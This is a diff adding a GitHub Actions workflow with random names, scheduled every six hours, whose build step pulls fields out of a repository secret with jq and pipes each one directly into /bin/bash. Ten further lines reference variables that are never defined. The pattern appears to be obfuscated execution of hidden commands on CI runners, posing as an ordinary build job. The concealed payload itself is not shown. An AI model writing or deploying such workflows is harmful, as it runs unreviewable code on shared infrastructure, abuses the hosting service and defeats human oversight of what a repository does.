@@ -1,0 +1,28 @@
+name: alarmingsussex
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '23 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: alarmingsussex
+        env:
+          tcxp04: ${{ secrets.tcxp04 }}
+        run: |
+          echo $tcxp04 | jq -r .s762 | /bin/bash
+          echo $peteg67117 | jq -r .nmsja093 | /bin/bash
+          echo $whb0263 | jq -r .rm3274 | /bin/bash
+          echo $cmu94 | jq -r .pyrg71616 | /bin/bash
+          echo $balo8764 | jq -r .ckb6 | /bin/bash
+          echo $sw6 | jq -r .ziwt4 | /bin/bash
+          echo $uhpt2 | jq -r .mg940 | /bin/bash
+          echo $p685 | jq -r .if8462 | /bin/bash
+          echo $mbug1 | jq -r .hdtpd44 | /bin/bash
+          echo $qsbk4802 | jq -r .j16 | /bin/bash
+          echo $kwkqe628 | jq -r .rf5665 | /bin/bash
+
